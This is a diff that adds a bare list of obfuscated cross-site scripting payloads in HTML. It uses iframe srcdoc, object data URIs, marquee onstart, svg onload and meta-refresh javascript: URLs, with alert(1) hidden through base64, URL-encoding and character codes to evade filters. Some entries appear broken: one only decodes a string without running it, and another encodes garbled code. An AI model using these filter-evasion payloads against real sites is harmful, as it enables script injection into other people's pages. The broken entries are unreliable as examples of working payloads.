@@ -1,0 +1,13 @@
+```html
+<iframe srcdoc="<svg onload=atob('YWxlcnQoMSk=')>"></iframe>
+<iframe srcdoc='<object data="data:text/html;base64,PHN2ZyBvbmxvYWQ9YXQobmV3IFdpbmRvdyguLi5nZXRFbGVtZW50QnlJZChuZXcgQXJyYXkoJ3MnKSkuZ2V0QXR0cmlidXRlKCdvbmxvYWQnKS5yZXBsYWNlKCdzJywnJykgKyAnYWxlcnQoMSknKQ==')></object>'></iframe>
+<marquee onstart=eval(decodeURIComponent('%61%6C%65%72%74(1)'))></marquee>
+<iframe srcdoc="<meta http-equiv='refresh' content='0;url=javascript:al%65rt%281%29'>"></iframe>
+<object data="javascript:al%65rt%281%29"></object>
+<svg onload=atob('YWxlcnQoMSk=')>
+<marquee onstart=eval(String.fromCharCode(97,108,101,114,116,40,49,41))></marquee>
+<iframe srcdoc="<meta http-equiv='refresh' content='0;url=javascript:eval(String.fromCharCode(97,108,101,114,116,40,49,41))'>"></iframe>
+<object data="data:text/html,<meta http-equiv='refresh' content='0;url=javascript:al%65rt%281%29'>"></object>
+<iframe srcdoc="<meta http-equiv='refresh' content='0;url=javascript:eval(atob('YWxlcnQoMSk='))'>"></iframe>
+<marquee onstart=window[atob('YWxlcnQ=')](1)></marquee>
+```
